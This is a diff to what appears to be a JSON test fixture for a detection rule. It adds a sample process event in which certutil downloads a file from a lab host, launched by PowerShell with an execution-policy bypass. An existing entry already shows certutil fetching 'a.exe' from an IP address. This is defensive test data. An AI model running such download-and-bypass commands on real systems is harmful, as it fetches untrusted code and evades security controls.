@@ -3,6 +3,14 @@
     {
       "Image": "C:\\Windows\\System32\\certutil.exe",
       "CommandLine": "certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe"
+    },
+    {
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "\"C:\\WINDOWS\\system32\\certutil.exe\" -urlcache -split -f http://192.168.56.1:8000/robots.txt C:\\Users\\Public\\detectforge_sim.txt",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentCommandLine": "\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\simulations.ps1 -Run T1053.005,T1547.001,T1136.001,T1070.001,T1105",
+      "User": "LAB\\user",
+      "OriginalFileName": "CertUtil.exe"
     }
   ],
   "should_not_match": [
